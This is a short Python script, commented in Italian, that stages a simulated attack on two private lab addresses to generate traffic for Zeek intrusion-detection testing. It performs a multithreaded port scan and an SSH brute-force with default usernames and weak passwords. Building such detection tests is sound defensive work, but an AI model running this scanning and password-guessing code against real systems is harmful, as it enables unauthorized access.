#!/usr/bin/env python3
import time
import socket
import paramiko
import logging
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

SERVERS = ["192.168.10.10", "192.168.10.11"]
PORTS_TO_SCAN = [21, 22, 23, 80, 443, 445, 8080, 3306]

def port_scan(target_ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        # Tenta una connessione (se fallisce, genera comunque traffico REJ in Zeek)
        s.connect_ex((target_ip, port))
        s.close()
    except Exception:
        pass

def simulate_ssh_bruteforce(target_ip):
    # Dizionario molto piccolo per testare rapidamente
    usernames = ["root", "admin", "sysadmin"]
    passwords = ["123456", "password", "admin"]
    
    for user in usernames:
        for pwd in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                # Timeout brevissimi per fare il brute-force velocemente
                ssh.connect(target_ip, username=user, password=pwd, timeout=1, auth_timeout=1)
                ssh.close()
            except Exception:
                pass

def main():
    logging.info("Inizio ATTACCO SIMULATO (Port Scan + SSH Bruteforce)...")
    
    # 1. Port Scan Multi-Threaded
    logging.info("Fase 1: Esecuzione Port Scan rapido sulle subnet...")
    with ThreadPoolExecutor(max_workers=20) as executor:
        for server in SERVERS:
            for port in PORTS_TO_SCAN:
                executor.submit(port_scan, server, port)
                
    time.sleep(2)
    
    # 2. SSH Brute Force
    logging.info("Fase 2: Esecuzione SSH Brute-Force...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        for server in SERVERS:
            executor.submit(simulate_ssh_bruteforce, server)
            
    logging.info("Attacco simulato completato. Controllare i log di Zeek per le anomalie.")

if __name__ == "__main__":
    main()
